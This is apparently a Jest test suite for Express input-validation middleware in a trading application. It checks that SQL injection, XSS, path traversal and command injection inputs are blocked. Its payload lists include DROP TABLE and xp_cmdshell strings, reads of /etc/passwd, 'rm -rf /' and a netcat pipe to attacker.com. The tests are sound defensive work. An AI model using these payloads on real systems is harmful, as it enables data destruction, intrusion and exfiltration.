import request from 'supertest';
import express from 'express';
import { 
  preventSQLInjection, 
  preventXSS, 
  preventPathTraversal, 
  preventCommandInjection,
  validate,
  commonSchemas
} from '@/middleware/inputValidation';
import Joi from 'joi';

describe('Input Validation Middleware', () => {
  let app: express.Application;

  beforeEach(() => {
    app = express();
    app.use(express.json());
  });

  describe('preventSQLInjection', () => {
    beforeEach(() => {
      app.use(preventSQLInjection);
      app.post('/test', (req, res) => res.json({ success: true }));
    });

    const sqlInjectionPayloads = [
      "'; DROP TABLE users; --",
      "1' OR '1'='1",
      "admin'--",
      "' UNION SELECT * FROM users --",
      "1; INSERT INTO users VALUES ('hacker', 'password'); --",
      "' OR 1=1 #",
      "0x31303235343830303536",
      "'; EXEC xp_cmdshell('dir'); --",
      "' AND (SELECT COUNT(*) FROM information_schema.tables) > 0 --",
      "1' WAITFOR DELAY '00:00:05' --"
    ];

    sqlInjectionPayloads.forEach(payload => {
      it(`should block SQL injection: ${payload}`, async () => {
        const response = await request(app)
          .post('/test')
          .send({ input: payload });

        expect(response.status).toBe(400);
        expect(response.body.error).toBe('BAD_REQUEST');
      });
    });

    it('should allow safe input', async () => {
      const response = await request(app)
        .post('/test')
        .send({ input: 'normal user input' });

      expect(response.status).toBe(200);
      expect(response.body.success).toBe(true);
    });

    it('should check nested objects', async () => {
      const response = await request(app)
        .post('/test')
        .send({ 
          user: { 
            name: 'John',
            query: "'; DROP TABLE users; --"
          }
        });

      expect(response.status).toBe(400);
    });

    it('should check query parameters', async () => {
      const response = await request(app)
        .get('/test?search=' + encodeURIComponent("'; DROP TABLE users; --"));

      expect(response.status).toBe(400);
    });
  });

  describe('preventXSS', () => {
    beforeEach(() => {
      app.use(preventXSS);
      app.post('/test', (req, res) => res.json({ data: req.body }));
    });

    const xssPayloads = [
      '<script>alert("XSS")</script>',
      '<img src="x" onerror="alert(1)">',
      'javascript:alert("XSS")',
      '<iframe src="javascript:alert(1)"></iframe>',
      '<svg onload="alert(1)">',
      '<body onload="alert(1)">',
      '<div style="expression(alert(1))">',
      '<meta http-equiv="refresh" content="0;url=javascript:alert(1)">',
      '<object data="javascript:alert(1)">',
      '<embed src="javascript:alert(1)">'
    ];

    xssPayloads.forEach(payload => {
      it(`should block XSS: ${payload}`, async () => {
        const response = await request(app)
          .post('/test')
          .send({ content: payload });

        expect(response.status).toBe(400);
        expect(response.body.error).toBe('BAD_REQUEST');
      });
    });

    it('should sanitize safe HTML entities', async () => {
      const response = await request(app)
        .post('/test')
        .send({ content: 'Hello <world> & "friends"' });

      expect(response.status).toBe(200);
      expect(response.body.data.content).toBe('Hello &lt;world&gt; &amp; &quot;friends&quot;');
    });
  });

  describe('preventPathTraversal', () => {
    beforeEach(() => {
      app.use(preventPathTraversal);
      app.post('/test', (req, res) => res.json({ success: true }));
    });

    const pathTraversalPayloads = [
      '../../../etc/passwd',
      '..\\..\\..\\windows\\system32\\config\\sam',
      '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',
      '....//....//....//etc/passwd',
      '..\\..\\..\\etc\\passwd'
    ];

    pathTraversalPayloads.forEach(payload => {
      it(`should block path traversal: ${payload}`, async () => {
        const response = await request(app)
          .post('/test')
          .send({ path: payload });

        expect(response.status).toBe(400);
        expect(response.body.error).toBe('BAD_REQUEST');
      });
    });

    it('should allow safe paths', async () => {
      const response = await request(app)
        .post('/test')
        .send({ path: 'documents/file.txt' });

      expect(response.status).toBe(200);
    });
  });

  describe('preventCommandInjection', () => {
    beforeEach(() => {
      app.use(preventCommandInjection);
      app.post('/test', (req, res) => res.json({ success: true }));
    });

    const commandInjectionPayloads = [
      'test; cat /etc/passwd',
      'test && rm -rf /',
      'test | nc attacker.com 4444',
      'test `whoami`',
      'test $(id)',
      'test > /tmp/output',
      'test; powershell -c "Get-Process"',
      'test; cmd /c dir',
      'test; python -c "import os; os.system(\'ls\')"'
    ];

    commandInjectionPayloads.forEach(payload => {
      it(`should block command injection: ${payload}`, async () => {
        const response = await request(app)
          .post('/test')
          .send({ command: payload });

        expect(response.status).toBe(400);
        expect(response.body.error).toBe('BAD_REQUEST');
      });
    });

    it('should allow safe input', async () => {
      const response = await request(app)
        .post('/test')
        .send({ command: 'normal text input' });

      expect(response.status).toBe(200);
    });
  });

  describe('validate middleware', () => {
    const testSchema = {
      body: Joi.object({
        email: commonSchemas.email,
        password: commonSchemas.password,
        amount: commonSchemas.amount.optional()
      }),
      query: Joi.object({
        page: Joi.number().integer().min(1).default(1),
        limit: Joi.number().integer().min(1).max(100).default(10)
      })
    };

    beforeEach(() => {
      app.use(validate(testSchema));
      app.post('/test', (req, res) => res.json({ success: true }));
    });

    it('should validate valid input', async () => {
      const response = await request(app)
        .post('/test?page=1&limit=10')
        .send({
          email: 'test@example.com',
          password: 'StrongPass123!',
          amount: 100.50
        });

      expect(response.status).toBe(200);
    });

    it('should reject invalid email', async () => {
      const response = await request(app)
        .post('/test')
        .send({
          email: 'invalid-email',
          password: 'StrongPass123!'
        });

      expect(response.status).toBe(400);
      expect(response.body.error).toBe('VALIDATION_ERROR');
      expect(response.body.details).toContain('Body: "email" must be a valid email');
    });

    it('should reject weak password', async () => {
      const response = await request(app)
        .post('/test')
        .send({
          email: 'test@example.com',
          password: 'weak'
        });

      expect(response.status).toBe(400);
      expect(response.body.details.some((detail: string) => 
        detail.includes('Password must contain')
      )).toBe(true);
    });

    it('should reject invalid query parameters', async () => {
      const response = await request(app)
        .post('/test?page=0&limit=1000')
        .send({
          email: 'test@example.com',
          password: 'StrongPass123!'
        });

      expect(response.status).toBe(400);
      expect(response.body.details).toContain('Query: "page" must be greater than or equal to 1');
    });
  });

  describe('commonSchemas', () => {
    it('should validate UUID', () => {
      const validUuid = '123e4567-e89b-12d3-a456-426614174000';
      const invalidUuid = 'not-a-uuid';

      expect(commonSchemas.uuid.validate(validUuid).error).toBeUndefined();
      expect(commonSchemas.uuid.validate(invalidUuid).error).toBeDefined();
    });

    it('should validate trading symbol', () => {
      const validSymbol = 'BTC/USDT';
      const invalidSymbol = 'invalid-symbol';

      expect(commonSchemas.symbol.validate(validSymbol).error).toBeUndefined();
      expect(commonSchemas.symbol.validate(invalidSymbol).error).toBeDefined();
    });

    it('should validate exchange', () => {
      const validExchange = 'binance';
      const invalidExchange = 'unknown-exchange';

      expect(commonSchemas.exchange.validate(validExchange).error).toBeUndefined();
      expect(commonSchemas.exchange.validate(invalidExchange).error).toBeDefined();
    });

    it('should validate strong password', () => {
      const strongPassword = 'StrongPass123!';
      const weakPassword = 'weak';

      expect(commonSchemas.password.validate(strongPassword).error).toBeUndefined();
      expect(commonSchemas.password.validate(weakPassword).error).toBeDefined();
    });

    it('should validate IP address', () => {
      const validIPv4 = '192.168.1.1';
      const validIPv6 = '2001:0db8:85a3:0000:0000:8a2e:0370:7334';
      const invalidIP = 'not-an-ip';

      expect(commonSchemas.ipAddress.validate(validIPv4).error).toBeUndefined();
      expect(commonSchemas.ipAddress.validate(validIPv6).error).toBeUndefined();
      expect(commonSchemas.ipAddress.validate(invalidIP).error).toBeDefined();
    });
  });
});